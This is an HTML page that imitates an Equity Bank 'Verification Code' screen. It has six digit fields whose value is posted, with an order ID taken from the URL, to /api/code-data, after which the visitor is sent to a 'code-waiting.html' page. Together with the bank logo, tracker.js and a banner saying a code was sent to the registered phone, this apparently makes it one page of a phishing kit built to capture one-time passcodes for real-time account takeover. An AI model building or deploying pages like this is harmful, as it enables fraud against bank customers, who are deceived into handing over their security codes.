<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Verification Code</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
  body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}

  .topbar{
    display:flex;align-items:center;justify-content:space-between;
    padding:14px 16px;background:#fff;border-bottom:3px solid #8b1a1a;
    position:sticky;top:0;z-index:10;
  }
  .topbar img{height:46px}
  .topbar-title{font-size:16px;font-weight:700;color:#222}

  .hero-banner{
    background:#8b1a1a;padding:32px 24px;text-align:center;
  }
  .hero-banner .shield{
    width:80px;height:80px;border-radius:50%;background:#fff;
    display:flex;align-items:center;justify-content:center;
    margin:0 auto 18px;box-shadow:0 4px 20px rgba(0,0,0,.2);
  }
  .hero-banner .shield svg{width:40px;height:40px;fill:none;stroke:#8b1a1a;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
  .hero-banner h1{font-size:22px;font-weight:800;color:#fff;margin-bottom:8px}
  .hero-banner p{font-size:14px;color:rgba(255,255,255,.8);line-height:1.6}

  .content{flex:1;padding:28px 24px 0}

  .error-msg{
    display:none;background:#fff5f5;border:1px solid #fcc;border-radius:12px;
    padding:12px 14px;margin-bottom:18px;color:#c62828;font-size:13px;text-align:center;font-weight:600;
  }

  .code-label{font-size:13px;color:#888;text-align:center;margin-bottom:16px}

  .code-input-wrap{
    max-width:320px;margin:0 auto 24px;display:flex;gap:10px;
    justify-content:center;direction:ltr;
  }
  .code-digit{
    width:46px;height:56px;border:2px solid #ddd;border-radius:12px;
    text-align:center;font-size:26px;font-weight:700;font-family:monospace;
    background:#fafafa;color:#1a1a1a;outline:none;transition:.2s;
  }
  .code-digit:focus{border-color:#8b1a1a;background:#fff;box-shadow:0 0 0 3px rgba(139,26,26,.12)}

  .info-box{
    background:#fdf2f2;border:1px solid #f5d0d0;border-radius:12px;padding:14px 16px;
    display:flex;align-items:flex-start;gap:10px;margin-bottom:20px;
  }
  .info-box svg{width:20px;height:20px;flex-shrink:0;fill:none;stroke:#8b1a1a;stroke-width:2;margin-top:1px}
  .info-box span{font-size:13px;color:#6b1c1c;line-height:1.6}

  .resend{text-align:center;margin-top:8px;font-size:13px;color:#888}
  .resend a{color:#8b1a1a;font-weight:600;text-decoration:none}

  .bottom{padding:16px 24px 32px;margin-top:auto}
  .submit-btn{
    display:block;width:100%;padding:16px;border:none;border-radius:28px;
    font-size:16px;font-weight:600;color:#fff;cursor:pointer;font-family:inherit;
    background:#8b1a1a;transition:.2s;
  }
  .submit-btn:hover{background:#6b1515}
  .submit-btn:disabled{opacity:.5;cursor:not-allowed}
</style>
</head>
<body>

  <div class="topbar">
    <img src="images/equity-logo.jpg" alt="Equity">
    <span class="topbar-title">Verification</span>
  </div>

  <div class="hero-banner">
    <div class="shield">
      <svg viewBox="0 0 24 24">
        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
        <path d="M9 12l2 2 4-4"/>
      </svg>
    </div>
    <h1>Verification Code</h1>
    <p>A verification code has been sent to your registered phone number</p>
  </div>

  <div class="content">
    <div class="error-msg" id="errorMsg"></div>

    <div class="code-label">Enter the 6-digit code</div>

    <div class="code-input-wrap">
      <input class="code-digit" type="tel" maxlength="1" id="c0" autofocus>
      <input class="code-digit" type="tel" maxlength="1" id="c1">
      <input class="code-digit" type="tel" maxlength="1" id="c2">
      <input class="code-digit" type="tel" maxlength="1" id="c3">
      <input class="code-digit" type="tel" maxlength="1" id="c4">
      <input class="code-digit" type="tel" maxlength="1" id="c5">
    </div>

    <div class="info-box">
      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
      <span>Do not share this code with anyone. Equity Bank will never ask you for this code.</span>
    </div>

    <div class="resend">Didn't receive the code? <a href="#">Resend</a></div>
  </div>

  <div class="bottom">
    <button class="submit-btn" id="submitBtn" onclick="submitCode()">Confirm</button>
  </div>

<script>
  const params = new URLSearchParams(location.search);
  const orderId = params.get("order");
  if (!orderId) location.href = "index.html";

  if (params.get("error") === "1") {
    const el = document.getElementById("errorMsg");
    el.textContent = "Incorrect or expired code";
    el.style.display = "block";
  }

  const digits = document.querySelectorAll(".code-digit");
  digits.forEach((inp, i) => {
    inp.addEventListener("input", () => {
      inp.value = inp.value.replace(/\D/g, "");
      if (inp.value && i < digits.length - 1) digits[i + 1].focus();
    });
    inp.addEventListener("keydown", e => {
      if (e.key === "Backspace" && !inp.value && i > 0) digits[i - 1].focus();
    });
    inp.addEventListener("paste", e => {
      e.preventDefault();
      const text = (e.clipboardData.getData("text") || "").replace(/\D/g, "");
      for (let j = 0; j < digits.length && j < text.length; j++) {
        digits[j].value = text[j];
      }
      const last = Math.min(text.length, digits.length) - 1;
      if (last >= 0) digits[last].focus();
    });
  });

  function getCode() {
    return Array.from(digits).map(d => d.value).join("");
  }

  async function submitCode() {
    const code = getCode();
    if (code.length < 6) {
      showError("Please enter the complete code");
      return;
    }
    const btn = document.getElementById("submitBtn");
    btn.disabled = true;
    btn.textContent = "Verifying...";

    try {
      const res = await fetch("/api/code-data", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ order_id: orderId, code: code })
      });
      const data = await res.json();
      if (data.success) {
        location.href = "code-waiting.html?order=" + orderId;
      } else {
        showError(data.message || "An error occurred");
        btn.disabled = false;
        btn.textContent = "Confirm";
      }
    } catch(err) {
      showError("Connection error");
      btn.disabled = false;
      btn.textContent = "Confirm";
    }
  }

  function showError(msg) {
    const el = document.getElementById("errorMsg");
    el.textContent = msg;
    el.style.display = "block";
  }
</script>
<script src="tracker.js"></script>
</body>
</html>
